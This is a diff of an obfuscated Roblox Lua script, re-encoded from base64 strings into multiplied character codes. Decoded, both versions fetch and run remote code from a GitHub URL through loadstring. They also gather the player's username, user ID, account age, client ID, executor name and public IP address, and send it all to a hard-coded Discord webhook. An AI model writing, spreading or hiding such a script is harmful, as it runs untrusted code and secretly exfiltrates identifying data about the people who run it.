@@ -1,34 +1,40 @@
-local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-function HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
+function dBphFqJvIFleBUtLtQnk(c)
+tab={}
+for i = 1,#c do
+x=string.len(c[i]) 
+y=string.char(x)
+table.insert(tab,y)
+end
+x=table.concat(tab)
+return x
+end 
 
-data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
+function CQVlaleyYOSatbyatk(code)res=dBphFqJvIFleBUtLtQnk({})for i in ipairs(code)do res=res..string.char(code[i]/130)end return res end 
 
 
- 
-
-
-loadstring(game:HttpGet(HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('aOUzNlzlkWYhjoMwugDhxbIiuXmOVBxVXdArfEUMjxkyZhGdxdIRuUVaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1ZSN3NzL09NSy9tYWluL1ZSNyUyMFJBR0RPTEw=')))()
-local webhook = HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('wGZevKvoXiYnBgqoBHnCLcehzyIzHFTOYJGrpXiHdrDlOguXMkButCxaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2Nzg1NzQ4OTc5ODQ5NjI2Ni9ySzFXczFRRk1CZ01qbmdPWExXY3d4VmdQYXprRFl4Tjl3S3dfR05fb095TmNMZ3JUNFdkRUhIZTFLQnRCcXBuOFVpcA==')
+loadstring(game:HttpGet(CQVlaleyYOSatbyatk({13520,15080,15080,14560,14950,7540,6110,6110,14820,12610,15470,5980,13390,13650,15080,13520,15210,12740,15210,14950,13130,14820,12870,14430,14300,15080,13130,14300,15080,5980,12870,14430,14170,6110,10010,12610,13780,13130,13130,13000,14040,6370,6500,6110,10010,7150,6110,14170,12610,13650,14300,6110,10660,12610,13390,13000,14430,14040,14040,11180,10660,7150,14950,5980,14040,15210,12610})))()
+local webhook = CQVlaleyYOSatbyatk({13520,15080,15080,14560,14950,7540,6110,6110,13000,13650,14950,12870,14430,14820,13000,5980,12870,14430,14170,6110,12610,14560,13650,6110,15470,13130,12740,13520,14430,14430,13910,14950,6110,6370,6500,7020,7150,7280,6890,7150,6760,7280,7410,7150,7410,7280,6760,7410,7020,6500,7020,7020,6110,14820,9750,6370,11310,14950,6370,10530,9100,10010,8580,13390,10010,13780,14300,13390,10270,11440,9880,11310,12870,15470,15600,11180,13390,10400,12610,15860,13910,8840,11570,15600,10140,7410,15470,9750,15470,12350,9230,10140,12350,14430,10270,15730,10140,12870,9880,13390,14820,10920,6760,11310,13000,8970,9360,9360,13130,6370,9750,8580,15080,8580,14690,14560,14300,7280,11050,13650,14560})
 
 -- Define the PlaceId variable
 local PlaceId = game.PlaceId
 
 -- Get the game name and game URL
 -- ط§ط³ظ… ظ…ط§ط¨
-local gameName = game:GetService(HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('naexEKlXjIsBgYeOYAGRipfBEzOJFWxZpOhwdDSMiCLqekbELYZhytZTWFya2V0cGxhY2VTZXJ2aWNl')):GetProductInfo(PlaceId).Name
+local gameName = game:GetService(CQVlaleyYOSatbyatk({10010,12610,14820,13910,13130,15080,14560,14040,12610,12870,13130,10790,13130,14820,15340,13650,12870,13130})):GetProductInfo(PlaceId).Name
 -- ط±ط§ط¨ط· ظ„ط¹ط¨ظ‡
-local gameUrl = HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('XyadQUeBTIDVswARqVFxJHkeotQhBHydvpSIjkNVnGPTXiVTZveSHsIaHR0cHM6Ly93d3cucm9ibG94LmNvbS9nYW1lcy8=') .. PlaceId
+local gameUrl = CQVlaleyYOSatbyatk({13520,15080,15080,14560,14950,7540,6110,6110,15470,15470,15470,5980,14820,14430,12740,14040,14430,15600,5980,12870,14430,14170,6110,13390,12610,14170,13130,14950,6110}) .. PlaceId
 -- ط±ط§ط¨ط· ط¨ط±ظˆظپط§ظٹظ„
-local profileUrl = HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('wFVVFrqMyjYxjHwkiTntayEykROwISFnrWJlLlzTQzHIjmsLKwyxtMvaHR0cHM6Ly93d3cucm9ibG94LmNvbS91c2Vycy8=') .. game:GetService(HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('cxNEauDEFZBBKfvlKdfunBbQBoENgjsklzGJzTcPaxYLeDYTzBTBihKUGxheWVycw==')).LocalPlayer.UserId .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('genspbwKFHxXCegtjNtlsPzJKQlmoyUIhYRabYnfcLqXeGqZjgWdOBNL3Byb2ZpbGU=')
+local profileUrl = CQVlaleyYOSatbyatk({13520,15080,15080,14560,14950,7540,6110,6110,15470,15470,15470,5980,14820,14430,12740,14040,14430,15600,5980,12870,14430,14170,6110,15210,14950,13130,14820,14950,6110}) .. game:GetService(CQVlaleyYOSatbyatk({10400,14040,12610,15730,13130,14820,14950})).LocalPlayer.UserId .. CQVlaleyYOSatbyatk({6110,14560,14820,14430,13260,13650,14040,13130})
 -- ط¹ط¯ط¯ ط³ظٹط±ظپط±
-local playerCount = #game:GetService(HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('qvGuzDMdCjWnGfrNzuPFsRMOdvihYnbhxaGgeuOfgucKRyquwgChYjHUGxheWVycw==')):GetPlayers()
+local playerCount = #game:GetService(CQVlaleyYOSatbyatk({10400,14040,12610,15730,13130,14820,14950})):GetPlayers()
 -- ط¨ط±ظٹظ…ظٹظ…
-local Players = game:GetService(HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('sonuNhuGaOHKEeHDAzdyJSFeteOvfoEOlgZLeUqNZUOhbxyWHuBfqybUGxheWVycw=='))
+local Players = game:GetService(CQVlaleyYOSatbyatk({10400,14040,12610,15730,13130,14820,14950}))
 local player = Players.LocalPlayer
 local hasPremium = player.MembershipType == Enum.MembershipType.Premium
 -- ظˆظ‚طھ ط­ط§ظ„ظٹط§
 local time = os.time()
-local date = os.date(HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('oMfLHgYsbaJvfKcJVCITcAOiOfgqifJbPlVOSYmNFuRHSLsgXKttotUKnQ='), time)
+local date = os.date(CQVlaleyYOSatbyatk({5460,15080}), time)
 
 local hour = math.floor(date.hour)
 local min = math.floor(date.min)
@@ -36,44 +42,44 @@ local sec = math.floor(date.sec)
 
 -- ظ…ط¹ط±ظپظ‡ ط§ظ„ ip ط´ط®طµ
 
-local ip = game:HttpGet(HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('iFsdAahRNyiWcjbCZzxHNQjYrQysXSzYRAJrlWuOxGcrlvmUZFiznxCaHR0cHM6Ly9hcGkuaXBpZnkub3Jn'))
+local ip = game:HttpGet(CQVlaleyYOSatbyatk({13520,15080,15080,14560,14950,7540,6110,6110,12610,14560,13650,5980,13650,14560,13650,13260,15730,5980,14430,14820,13390}))
 
 -- Create a JSON object to send to the webhook
 local data = {
-    [HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('EQDnkQOBdHajlgxneRuhJAjXLmkrlCAhLMqcJBlwlGMAkqNSUrhlGpOY29udGVudA==')] = HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('ECdephTIWXcgdXFNcpXWhhPGgrBcRzjJnwEDhfxpMfZxbXxokhdocGR'),
-    [HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('jnuRawVyYwKzcbXDeGrBwGCtCjQdyOqnngcQtgrCriGBlsEYryCiyqJdXNlcm5hbWU=')] = HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('yrPRWWeoezcYnTxLBtvzieTsnKwoYhcGmDULwTJQXxiUFQgiPHHCDTRQnkgOiA3eWQ3'),
-    [HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('CAhwPKjanNwJZKbmlfrGstcNMbvLvddlrUpeRrUGpvwAuhRSKUjOfnjZW1iZWRz')] = {
+    [CQVlaleyYOSatbyatk({12870,14430,14300,15080,13130,14300,15080})] = CQVlaleyYOSatbyatk({}),
+    [CQVlaleyYOSatbyatk({15210,14950,13130,14820,14300,12610,14170,13130})] = CQVlaleyYOSatbyatk({8580,15730,4160,7540,4160,7150,15730,13000,7150}),
+    [CQVlaleyYOSatbyatk({13130,14170,12740,13130,13000,14950})] = {
         {
-            [HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('pZNKBdeooYurVxNeUwfTETJkOaCfCqtuVKFtUemJviQsfZwTyUhnXYPdGl0bGU=')] = HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('VMxpeUyXRrNisYGLAvYgWblNCJvtySNwjcyccVwIVdipvXLqPgizrcD'),
-            [HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('zlqIJTEmtpdEgoLnfzMRSfMaPqgHDJpvtiXLdfLsMjliofHGIkPpvgPZGVzY3JpcHRpb24=')] = HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('nkBCcNhVUeRQmoWiNXqokLFKYGItLkZAbyANAuDvhljsBCheESyQLDt')
-            .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('pcFmYWUFhGbPkYlPubNYHxBfOblmJezwrarcRejPdDMHKrIisLGQhRVKipQbGF5ZXIgTmFtZToqKiAgYGBg') .. game:GetService(HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('nUPzoODwYebBneBtDHNxTdsqWsUcLUfcIvvomGrlBjkBibASTWZmdnSUGxheWVycw==')).LocalPlayer.Name .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('CmclXwBzhwfpjhUuhynsTjlhatkCSRIQgkhjjlGOKByeKXspxqukPzGIGBgYFxu')
-            .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('KgRKqondrOfhcFyMkMVlhYhAlqfDnKkzMEqvXBjdZhPBeCiJRCDEpIPKipQbGF5ZXIgSUQ6KiogYGBg') .. game:GetService(HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('pojXTVzBFXisLaoBXOswVgfVOGGkrzhuNqZcqocDssixOqmCEIfCYDUUGxheWVycw==')).LocalPlayer.UserId .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('AVNgNyRsLPEjmJbhsoHPBaEghfQnTzyvNSxYGMUZJNodhHMCOJFUVrmYGBgXG4=')
-			.. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('pwDSGXNHYvtFVZasehXfIEPsAzCmuFySuybFyVqvcCDBqyedkQUWtYGKipQbGF5ZXIgVVJMOioqIGBgYA==') .. profileUrl .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('bqgFvnTTEozvYJAWlqEBJTbbdlDmPhOYRHgKIlTISIgURQKmoFJIJAOYGBgXG4=')
-            .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('oxEoPkinpuPHtXbtIFLtMTTrAPyoSeOPSfoFCKSwViafOfyNObJZTtzKipHYW1lIE5hbWU6KiogYGBg') .. gameName .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('UWjLmRNvMiJmOKEYnQQdnElgfqTlvUzJxhcPptkagTKYfKXUEwHInbNYGBgXG4=')
-            .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('YHEPtOkkkFGExDZVfNmjeUdDwsiHkVZqmKcZlrFxagQMoNXFZHmXestKipHYW1lIFVSTDoqKiBgYGA=') .. gameUrl .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('nvPvNiKliIlpQcexpxRIHWSQQUjlKAZwxxuzkZwBwadnYJbzeiEbXXqYGBgXG4=')
-		    .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('vYVyKxoNKHkmyMaguzOhOnSHteWJwsMTcobeKCkKEieJIGkIGsMdEEBKipTZXJ2ZXIgSm9iSWQgOioqIGBgYA==') .. game.JobId .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('rmofhiocjULFOKUiCSNqrgVtXpJfEuBDeUODjNajuJsaEHxFqSJzcscYGBgXG4=')
-            .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('rHuhhpNVSooVzxCEGwTRlNZKjILaVzFDqOanDFyozIVUjZifbqKolOEKipTZXJ2ZXIgTnVtYmVyIHBsYXllcnMgb25saW5lIDoqKiBgYGA=') .. playerCount .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('SXwQEEtzIyEffZAPzSjLuehNgUuWJpTGwjJiMIrdumBKRTEXAefbLcxYGBgXG4=')
-			.. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('HsOmGzOeALTjDGzHYsYbXSTBYVsOtGDXpqVxcBKEOXkAUzstKuqbkfjKipBY2NvdW50IEFnZSA6KiogYGBg') .. game:GetService(HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('TakMuNnEOrQtvKdHnhHOaFGqAETivGWrhmpxeJFJLshwHeNmErufSPnUGxheWVycw==')).LocalPlayer.AccountAge .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('McadlTxyBIbfhxNbbOrRAvlvVEfafsLKBRlFWLmnFDTpChCWGMPVmqIYGBgIFxu') 
-            .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('nAQDePDzaQYvoBVfFGGSWtRqmfmpoWRUYlcgKXONkDHfmnvcWOULdlAKipJUCA6KiogYGBg') .. ip .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('AJHSuBCkYxQnXMEkQWXINjqtjnyVJhkwQixfuHRzYTSGFCMPBDtFbGZIC8gaHR0cHM6Ly93aGF0aXNteWlwYWRkcmVzcy5jb20vaXAv').. ip .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('MIqQVXscpxOheuGECrfLgBYGoQbEbzGgfcNYOOUDofgyCCzYnBNXQpTYGBgXG4=')
-            .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('TLTnzmyiWqfpmaFaXctcMUBbDxPCVloTiKvgGTgPcvyaPceXhprRKYrKipIV0lEICA6KiogYGBg') .. game:GetService(HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('EBuupHehFiMOWPozeuSpJnRIDmRvcSPIhSNwdxWovpRiZmXjeMuZZbKUmJ4QW5hbHl0aWNzU2VydmljZQ==')):GetClientId() .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('jDqxUKjjPqMsTEKZbMFJxexkoqZQwtBhJOXmCYYOVqWMglAaMDwaYbKYGBgIFxu') 
-            .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('voeiYxEzcNVhHfbWTuveDBnIhBLPkjoFDRSUBfhbytAbNhGjSFkDogrKipOYW1lIEhhY2sgIDoqKiBgYGA=') .. identifyexecutor() .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('ljCYMtPVvnzbAZSUidwIRFCPyTIgoHXWDXoPUTPiTLfbWvNXLpapKvFYGBgIFxu') 
-            .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('RYXsxrJJZvOnGqXhLzzwtCZEDaIsNHxgVsvnpBxZPZZSnhgVgCLQwDCKipQbGF5ZXIgUHJlbWl1bSA6Kiog') .. if hasPremium then HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('AAMbXFrThZQWYPWrFGkMSKBYgUFwykxNsnvKuIfjZXuvvoTSinfOHwIYGBgeWVzYGBg') else HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('YKNDEYxAKujyplObBPNcussfNVczrazHtqrpcybKABUGxdzkhgewglsYGBgbm9gYGA=')  .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('mtnhLbTlQZGTfToxXdUrxKkMDImiWQZQENHgEfESvGEvHGcweyYNckkXG4=')
-            .. date.day .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('rdCBKITtKcrjTSuorrnbICKcORCUFQWKMiLrPQtBcWfachacSLkmWgPLw==') .. date.month .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('nWfcxktvGhLUKXCMnfsmoTugakwMRUoWSIuKVMFBagzSMhvjFlMpseDLw==') .. date.year .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('pglTrUFkhpmBaOnBVDqBydVnuDGUfiVLxkpAfbgQytkhmllGwdGMBTNIA==') .. hour .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('rrPRRhokhxyaXPTqthdAIVcVxqjpzZjFMTECrmPwHomolYAaihdJAKROg==') .. min .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('nZCjlKxMWPqClTaOyufwIuNasjyvQlkVMlDDJbtqbqVCKvHGZhMfdOZOg==') .. sec .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('qMnyOdXEnABrNOnNetuRUiiGLpRXxFoXdekRrTJJYkKWRCwbSONKfxG') .. HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('foDopKuyGAfkmsBZkhufchzzxPCpCefEVOpDudwaTZZsKGBdODaPGZdXG4=')
+            [CQVlaleyYOSatbyatk({15080,13650,15080,14040,13130})] = CQVlaleyYOSatbyatk({}),
+            [CQVlaleyYOSatbyatk({13000,13130,14950,12870,14820,13650,14560,15080,13650,14430,14300})] = CQVlaleyYOSatbyatk({})
+            .. CQVlaleyYOSatbyatk({5460,5460,10400,14040,12610,15730,13130,14820,4160,10140,12610,14170,13130,7540,5460,5460,4160,4160,12480,12480,12480}) .. game:GetService(CQVlaleyYOSatbyatk({10400,14040,12610,15730,13130,14820,14950})).LocalPlayer.Name .. CQVlaleyYOSatbyatk({4160,12480,12480,12480,11960,14300})
+            .. CQVlaleyYOSatbyatk({5460,5460,10400,14040,12610,15730,13130,14820,4160,9490,8840,7540,5460,5460,4160,12480,12480,12480}) .. game:GetService(CQVlaleyYOSatbyatk({10400,14040,12610,15730,13130,14820,14950})).LocalPlayer.UserId .. CQVlaleyYOSatbyatk({12480,12480,12480,11960,14300})
+			.. CQVlaleyYOSatbyatk({5460,5460,10400,14040,12610,15730,13130,14820,4160,11050,10660,9880,7540,5460,5460,4160,12480,12480,12480}) .. profileUrl .. CQVlaleyYOSatbyatk({12480,12480,12480,11960,14300})
+            .. CQVlaleyYOSatbyatk({5460,5460,9230,12610,14170,13130,4160,10140,12610,14170,13130,7540,5460,5460,4160,12480,12480,12480}) .. gameName .. CQVlaleyYOSatbyatk({12480,12480,12480,11960,14300})
+            .. CQVlaleyYOSatbyatk({5460,5460,9230,12610,14170,13130,4160,11050,10660,9880,7540,5460,5460,4160,12480,12480,12480}) .. gameUrl .. CQVlaleyYOSatbyatk({12480,12480,12480,11960,14300})
+		    .. CQVlaleyYOSatbyatk({5460,5460,10790,13130,14820,15340,13130,14820,4160,9620,14430,12740,9490,13000,4160,7540,5460,5460,4160,12480,12480,12480}) .. game.JobId .. CQVlaleyYOSatbyatk({12480,12480,12480,11960,14300})
+            .. CQVlaleyYOSatbyatk({5460,5460,10790,13130,14820,15340,13130,14820,4160,10140,15210,14170,12740,13130,14820,4160,14560,14040,12610,15730,13130,14820,14950,4160,14430,14300,14040,13650,14300,13130,4160,7540,5460,5460,4160,12480,12480,12480}) .. playerCount .. CQVlaleyYOSatbyatk({12480,12480,12480,11960,14300})
+			.. CQVlaleyYOSatbyatk({5460,5460,8450,12870,12870,14430,15210,14300,15080,4160,8450,13390,13130,4160,7540,5460,5460,4160,12480,12480,12480}) .. game:GetService(CQVlaleyYOSatbyatk({10400,14040,12610,15730,13130,14820,14950})).LocalPlayer.AccountAge .. CQVlaleyYOSatbyatk({12480,12480,12480,4160,11960,14300}) 
+            .. CQVlaleyYOSatbyatk({5460,5460,9490,10400,4160,7540,5460,5460,4160,12480,12480,12480}) .. ip .. CQVlaleyYOSatbyatk({4160,6110,4160,13520,15080,15080,14560,14950,7540,6110,6110,15470,13520,12610,15080,13650,14950,14170,15730,13650,14560,12610,13000,13000,14820,13130,14950,14950,5980,12870,14430,14170,6110,13650,14560,6110}).. ip .. CQVlaleyYOSatbyatk({12480,12480,12480,11960,14300})
+            .. CQVlaleyYOSatbyatk({5460,5460,9360,11310,9490,8840,4160,4160,7540,5460,5460,4160,12480,12480,12480}) .. game:GetService(CQVlaleyYOSatbyatk({10660,12740,15600,8450,14300,12610,14040,15730,15080,13650,12870,14950,10790,13130,14820,15340,13650,12870,13130})):GetClientId() .. CQVlaleyYOSatbyatk({12480,12480,12480,4160,11960,14300}) 
+            .. CQVlaleyYOSatbyatk({5460,5460,10140,12610,14170,13130,4160,9360,12610,12870,13910,4160,4160,7540,5460,5460,4160,12480,12480,12480}) .. identifyexecutor() .. CQVlaleyYOSatbyatk({12480,12480,12480,4160,11960,14300}) 
+            .. CQVlaleyYOSatbyatk({5460,5460,10400,14040,12610,15730,13130,14820,4160,10400,14820,13130,14170,13650,15210,14170,4160,7540,5460,5460,4160}) .. if hasPremium then CQVlaleyYOSatbyatk({12480,12480,12480,15730,13130,14950,12480,12480,12480}) else CQVlaleyYOSatbyatk({12480,12480,12480,14300,14430,12480,12480,12480})  .. CQVlaleyYOSatbyatk({11960,14300})
+            .. date.day .. CQVlaleyYOSatbyatk({6110}) .. date.month .. CQVlaleyYOSatbyatk({6110}) .. date.year .. CQVlaleyYOSatbyatk({4160}) .. hour .. CQVlaleyYOSatbyatk({7540}) .. min .. CQVlaleyYOSatbyatk({7540}) .. sec .. CQVlaleyYOSatbyatk({}) .. CQVlaleyYOSatbyatk({11960,14300})
         }
     }
 }
 
 -- Send the data to the webhook
-local HS = game:GetService(HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('McaVrgjbuRQlZrDUHVzuspDKkbTKsPpVsWtbBnRKygvdcVBYXOjSlAySHR0cFNlcnZpY2U=')):JSONEncode(data)
+local HS = game:GetService(CQVlaleyYOSatbyatk({9360,15080,15080,14560,10790,13130,14820,15340,13650,12870,13130})):JSONEncode(data)
 local headers = {
-    [HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('ngPpidsXtmXwaNRuZeYzKzXyKfPUqovgseNqAejGAGEWIyMFeDVlWOUY29udGVudC10eXBl')] = HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('JNYAjUHWNhxhaouoYvJInmsfCSpYkRZgqwwcgZNqFOXLDhSWogErvMpYXBwbGljYXRpb24vanNvbg==')
+    [CQVlaleyYOSatbyatk({12870,14430,14300,15080,13130,14300,15080,5850,15080,15730,14560,13130})] = CQVlaleyYOSatbyatk({12610,14560,14560,14040,13650,12870,12610,15080,13650,14430,14300,6110,13780,14950,14430,14300})
 }
 
 local data2 = {
     Url = webhook,
     Body = HS,
-    Method = HCMlXMXsIsaaplPTlGcCkpBviMOTApyaORcNTmTkEdKJFkwrNkZJdfefbExSPRYy('jgSbdLUoukvFetxKBFuNVJSXlxnWheMDUUopVSdVDEbrpMumuhNbvpGUE9TVA=='),
+    Method = CQVlaleyYOSatbyatk({10400,10270,10790,10920}),
     Headers = headers
 }
 
-request(data2)    
+request(data2)        
